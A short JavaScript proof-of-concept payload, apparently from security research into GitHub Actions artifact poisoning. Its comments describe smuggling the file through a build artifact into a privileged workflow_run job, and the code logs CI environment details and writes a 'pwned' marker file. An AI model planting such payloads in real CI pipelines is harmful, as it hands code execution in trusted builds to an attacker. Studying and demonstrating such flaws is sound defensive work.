'use strict';
// Attacker version: shipped to the sizebot job via the sizebot-results artifact
// and extracted over the trusted checkout in the privileged workflow_run job.
const fs = require('fs');
console.log('PWNED-RENDER ' + JSON.stringify({
  cwd: process.cwd(),
  runId: process.env.GITHUB_RUN_ID,
  workflow: process.env.GITHUB_WORKFLOW,
  event: process.env.GITHUB_EVENT_NAME,
}));
fs.writeFileSync('sizebot-pwned.txt', 'executed by ' + process.env.GITHUB_WORKFLOW + '\n');
